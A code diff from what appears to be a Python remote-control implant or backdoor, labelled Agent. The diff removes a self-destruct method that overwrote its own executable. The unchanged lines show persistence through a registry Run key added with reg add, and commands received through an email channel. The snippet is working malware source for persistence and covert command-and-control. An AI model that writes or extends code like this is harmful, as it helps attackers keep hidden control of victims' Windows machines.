@@ -68,18 +68,10 @@ class Agent:
         _path = sys.executable
         cmd = r'reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v {} /f /d "\"{}\""'.format(Persist.NAME.value, _path)
         subprocess.Popen(cmd, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-    
-    def destroy(self):
-        if not hasattr(sys, 'frozen'):
-            return 
         
-        with open(sys.executable, 'wb') as f:
-            f.write('NOTHING'.encode('utf-8'))
-    
     def remove(self):
         self.dislodge()
         self.stop()
-        self.destroy()
 
     def check_commands(self):
         return self.email.recv()
